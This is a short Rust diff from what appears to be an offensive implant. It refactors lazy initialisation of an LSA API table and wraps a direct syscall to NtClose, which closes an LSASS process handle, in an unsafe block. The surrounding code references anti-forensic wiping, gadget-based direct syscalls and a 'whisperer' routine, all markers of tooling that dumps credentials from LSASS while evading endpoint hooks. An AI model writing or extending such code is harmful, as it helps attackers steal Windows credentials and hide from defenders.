@@ -233,10 +233,16 @@ static LSA_APIS: OnceLock<LsaApis> = OnceLock::new();
 /// Return a `'static` reference to the resolved LSA API table, initialising
 /// it on first call.
 fn get_lsa_apis() -> Result<&'static LsaApis> {
-    LSA_APIS.get_or_try_init(|| unsafe { resolve_lsa_apis() }).map(|_| {
-        // SAFETY: get_or_try_init just proved the cell is occupied.
-        LSA_APIS.get().unwrap()
-    })
+    if let Some(apis) = LSA_APIS.get() {
+        return Ok(apis);
+    }
+
+    let resolved = unsafe { resolve_lsa_apis()? };
+    let _ = LSA_APIS.set(resolved);
+
+    LSA_APIS
+        .get()
+        .ok_or_else(|| anyhow!("failed to initialize LSA API table"))
 }
 
 // ── Anti-forensic: volatile zero ───────────────────────────────────────────
@@ -1181,11 +1187,11 @@ pub fn whisperer_stop() -> Result<String> {
 
         // Close the LSASS process handle via NtClose.
         if let Ok(close_tgt) = crate::syscalls::get_syscall_id("NtClose") {
-            let _ = crate::syscalls::do_syscall(
+            let _ = unsafe { crate::syscalls::do_syscall(
                 close_tgt.ssn,
                 close_tgt.gadget_addr,
                 &[proc_handle as u64],
-            );
+            ) };
         }
 
         log::info!(
